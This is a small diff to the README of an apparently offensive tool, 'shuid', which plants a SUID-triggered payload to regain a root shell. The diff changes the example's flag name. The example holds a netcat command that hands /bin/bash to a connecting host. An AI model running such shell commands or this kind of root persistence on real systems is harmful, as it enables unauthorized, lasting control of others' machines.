@@ -20,7 +20,7 @@ And that's all, **root shell** is obtained and process to obtain it again will b
 You can choose which SUID will trigger your payload (`-c`). And, obviously, you can also custom the payload (`--payload`).
 An example:
 ```shell
-./shuid -c --command "nc 127.0.0.2 -e /bin/bash"
+./shuid -c --payload "nc 127.0.0.2 -e /bin/bash"
 ```
 
 
